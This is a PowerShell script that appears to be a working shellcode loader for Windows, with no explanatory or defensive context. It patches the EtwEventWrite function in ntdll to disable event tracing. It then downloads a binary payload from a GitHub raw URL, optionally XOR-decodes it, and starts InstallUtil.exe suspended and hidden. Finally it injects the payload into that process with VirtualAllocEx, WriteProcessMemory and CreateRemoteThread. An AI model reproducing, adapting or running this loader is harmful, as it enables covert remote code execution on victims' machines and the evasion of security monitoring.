$PayloadURL = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin"
$Target = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
$XorKey = ""
$VerboseOutput = $true

$ErrorActionPreference = "Stop"

$sw = [Diagnostics.Stopwatch]::StartNew()
$script:last = [int64]0
function Log($msg) {
    if (-not $VerboseOutput) { return }
    $now = $sw.ElapsedMilliseconds
    Write-Host ("[+] {0} ({1} ms)" -f $msg, ($now - $script:last))
    $script:last = $now
}

$src = @"
using System;
using System.Runtime.InteropServices;

public class Loader
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type -TypeDefinition $src
Log "Add-Type compiled"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    $ntdll = [Loader]::GetModuleHandle("ntdll.dll")
    $etw = [Loader]::GetProcAddress($ntdll, "EtwEventWrite")
    $old = [uint32]0
    if (-not [Loader]::VirtualProtect($etw, [uint32]3, [uint32]0x40, [ref]$old)) { throw "etw protect failed" }
    [Runtime.InteropServices.Marshal]::WriteByte($etw, 0, [byte]0x33)
    [Runtime.InteropServices.Marshal]::WriteByte($etw, 1, [byte]0xC0)
    [Runtime.InteropServices.Marshal]::WriteByte($etw, 2, [byte]0xC3)
    [Loader]::VirtualProtect($etw, [uint32]3, [uint32]$old, [ref]$old) | Out-Null
    Log ("ETW patched at 0x{0:X}" -f $etw.ToInt64())
} catch { Log "ETW patch failed" }

$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$sc = $wc.DownloadData($PayloadURL)
Log ("downloaded {0} bytes" -f $sc.Length)
if ($sc.Length -eq 0) { exit }

if ($XorKey -ne "") {
    $kb = [Text.Encoding]::ASCII.GetBytes($XorKey)
    for ($i = 0; $i -lt $sc.Length; $i++) { $sc[$i] = $sc[$i] -bxor $kb[$i % $kb.Length] }
    Log "xor decoded"
}

$si = [Loader+STARTUPINFO]::new()
$si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = [Loader+PROCESS_INFORMATION]::new()
if (-not [Loader]::CreateProcess($Target, $Target, [IntPtr]::Zero, [IntPtr]::Zero, $false, [uint32]0x08000004, [IntPtr]::Zero, $env:SystemRoot, [ref]$si, [ref]$pi)) { Log "CreateProcess failed"; exit }
Log ("spawned pid {0}" -f $pi.dwProcessId)

$addr = [Loader]::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero, [uint32]$sc.Length, [uint32]0x3000, [uint32]0x40)
if ($addr.ToInt64() -eq 0) { Log "VirtualAllocEx failed"; exit }
Log ("allocated 0x{0:X}" -f $addr.ToInt64())

$written = [uint32]0
if (-not [Loader]::WriteProcessMemory($pi.hProcess, $addr, $sc, [uint32]$sc.Length, [ref]$written)) { Log "WriteProcessMemory failed"; exit }
Log ("wrote {0} bytes" -f $written)

$tid = [uint32]0
$hThread = [Loader]::CreateRemoteThread($pi.hProcess, [IntPtr]::Zero, [uint32]0, $addr, [IntPtr]::Zero, [uint32]0, [ref]$tid)
if ($hThread.ToInt64() -eq 0) { Log "CreateRemoteThread failed"; exit }
Log ("remote thread {0} running" -f $tid)

[Loader]::CloseHandle($hThread) | Out-Null
[Loader]::CloseHandle($pi.hProcess) | Out-Null
[Loader]::CloseHandle($pi.hThread) | Out-Null

if ($VerboseOutput) { Write-Host ("[+] total {0} ms" -f $sw.ElapsedMilliseconds) }
